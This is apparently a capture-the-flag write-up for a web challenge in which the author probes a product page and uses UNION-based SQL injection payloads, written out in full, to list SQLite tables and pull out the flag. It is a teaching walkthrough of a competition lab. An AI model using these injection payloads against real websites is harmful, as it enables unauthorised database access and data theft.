## Description
We have amazing new products for our gaming service! Unfortunately we don't sell our unreleased flag product yet !

## Solution
We are given a site which looks like this-
<img width="1918" height="723" alt="image" src="https://github.com/user-attachments/assets/803a3530-acd2-4066-a400-c90e5b1753d8" />

The site displays products in the form of `/product?product_id=1` and so on
<img width="1919" height="666" alt="image" src="https://github.com/user-attachments/assets/5caf0c40-a3a1-421b-a016-96bc3bc76103" />

First we tried fuzzing from 1 to 11 after which no product comes then so not IDOR, so let's try SQLi. 

Trying `/product?product_id=-1%20UNION%20SELECT%201,2,3,4--%20` gave the table structure, confirming we have 4 columns.

Now trying `/product?product_id=-1%20UNION%20SELECT%201,(SELECT%20group_concat(name,0x3a)%20FROM%20sqlite_master%20WHERE%20type='table'),3,4--%20` gave 
```
ID Name Description Price
1 products58sqlite_sequence58flag 3 4
```

and finally writing `https://meteor.sunshinectf.games/product?product_id=-1%20UNION%20SELECT%201,(SELECT%20group_concat(flag,0x3a)%20FROM%20flag),3,4--%20
` we get the flag `sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}`



